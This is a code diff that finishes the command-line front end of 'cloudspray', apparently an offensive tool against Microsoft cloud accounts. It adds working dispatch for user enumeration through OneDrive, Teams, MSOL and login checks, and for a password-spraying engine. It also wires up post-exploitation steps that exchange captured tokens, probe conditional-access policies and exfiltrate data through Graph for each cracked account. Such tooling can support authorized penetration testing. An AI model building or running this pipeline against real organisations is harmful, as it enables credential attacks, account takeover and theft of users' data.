@@ -102,12 +102,41 @@ def enum_cmd(ctx, domain, users, method, output, teams_user, teams_pass):
         reporter.error("Teams method requires --teams-user and --teams-pass.")
         raise SystemExit(1)
 
+    from cloudspray.enum import OneDriveEnumerator, TeamsEnumerator, MSOLEnumerator, LoginEnumerator
+    from cloudspray.utils import read_userlist
+
+    userlist = read_userlist(users)
+
     with StateDB(ctx.obj["db_path"]) as db:
         reporter.info(f"Enumeration starting: domain={domain}, method={method}")
-        reporter.info(f"User list: {users}")
+        reporter.info(f"User list: {users} ({len(userlist)} entries)")
+
+        if method == "onedrive":
+            enumerator = OneDriveEnumerator(domain, db, reporter)
+            valid = enumerator.enumerate(userlist)
+        elif method == "teams":
+            enumerator = TeamsEnumerator(
+                domain, db, reporter,
+                auth_user=cfg.enum.teams_user,
+                auth_pass=cfg.enum.teams_pass,
+            )
+            valid = enumerator.enumerate(userlist)
+        elif method == "msol":
+            enumerator = MSOLEnumerator(domain, db, reporter)
+            valid = enumerator.enumerate(userlist)
+        elif method == "login":
+            enumerator = LoginEnumerator(domain, db, reporter)
+            valid = enumerator.enumerate(userlist)
+        else:
+            reporter.error(f"Unknown enumeration method: {method}")
+            return
+
         if output:
-            reporter.info(f"Output file: {output}")
-        reporter.info("Enumeration engine not yet implemented.")
+            with open(output, "w") as f:
+                f.write("\n".join(valid) + "\n")
+            reporter.info(f"Valid users written to {output}")
+
+        reporter.info(f"Enumeration complete: {len(valid)} valid users found")
 
 
 @cli.command("spray")
@@ -169,9 +198,18 @@ def spray_cmd(ctx, domain, users, passwords, password, delay, jitter,
     if shuffle is not None:
         cfg.spray.shuffle_mode = shuffle
 
+    from cloudspray.spray import Authenticator, SprayEngine
+    from cloudspray.utils import read_userlist, read_password_list
+
+    userlist = read_userlist(users)
+    if passwords:
+        passlist = read_password_list(passwords)
+    else:
+        passlist = [password]
+
     with StateDB(ctx.obj["db_path"]) as db:
         reporter.info(f"Spray engine starting: domain={domain}")
-        reporter.info(f"User list: {users}")
+        reporter.info(f"User list: {users} ({len(userlist)} entries)")
         reporter.info(
             f"Delay={cfg.spray.delay}s, Jitter={cfg.spray.jitter}s, "
             f"Shuffle={cfg.spray.shuffle_mode}"
@@ -179,7 +217,10 @@ def spray_cmd(ctx, domain, users, passwords, password, delay, jitter,
         if resume:
             attempted = db.get_attempted_pairs()
             reporter.info(f"Resuming: {len(attempted)} attempts already recorded.")
-        reporter.info("Spray engine not yet implemented.")
+
+        authenticator = Authenticator(cfg.target.domain)
+        engine = SprayEngine(cfg, db, authenticator, reporter)
+        engine.run(userlist, passlist)
 
 
 @cli.command("post")
@@ -198,6 +239,10 @@ def post_cmd(ctx, foci, ca_probe, exfil, user):
         reporter.error("Specify at least one action: --foci, --ca-probe, or --exfil.")
         raise SystemExit(1)
 
+    from cloudspray.post import TokenManager, CAProbe, GraphExfil
+
+    cfg = ctx.obj["config"]
+
     with StateDB(ctx.obj["db_path"]) as db:
         creds = db.get_valid_credentials()
         if not creds:
@@ -207,12 +252,25 @@ def post_cmd(ctx, foci, ca_probe, exfil, user):
         reporter.info(f"Post-exploitation: {len(creds)} valid credential(s) available.")
         if user:
             reporter.info(f"Targeting user: {user}")
+
         if foci:
-            reporter.info("FOCI token exchange not yet implemented.")
+            token_mgr = TokenManager(cfg.target.domain, db, reporter)
+            results = token_mgr.exchange_all_valid_credentials()
+            for username, tokens in results.items():
+                reporter.info(f"  {username}: {len(tokens)} tokens captured")
+
         if ca_probe:
-            reporter.info("CA policy probing not yet implemented.")
+            prober = CAProbe(cfg.target.domain, db, reporter)
+            probe_results = prober.probe_all_blocked()
+            prober.print_matrix(probe_results)
+
         if exfil:
-            reporter.info("Data exfiltration check not yet implemented.")
+            with GraphExfil(db, reporter) as exfiltrator:
+                if user:
+                    exfiltrator.run_all(user)
+                else:
+                    for cred in db.get_valid_credentials():
+                        exfiltrator.run_all(cred.username)
 
 
 @cli.command("report")
@@ -236,8 +294,18 @@ def report_cmd(ctx, output_format, output):
 
     reporter.banner()
 
+    from cloudspray.reporting import JSONReporter, CSVReporter
+
     with StateDB(ctx.obj["db_path"]) as db:
-        creds = db.get_valid_credentials()
         reporter.info(f"Generating {output_format.upper()} report: {output}")
-        reporter.info(f"Found {len(creds)} valid credential(s).")
-        reporter.info("Report generation not yet implemented.")
+
+        if output_format == "json":
+            report_writer = JSONReporter(db)
+        elif output_format == "csv":
+            report_writer = CSVReporter(db)
+        else:
+            reporter.error(f"Unknown report format: {output_format}")
+            return
+
+        report_writer.generate(output)
+        reporter.info(f"Report written to {output}")
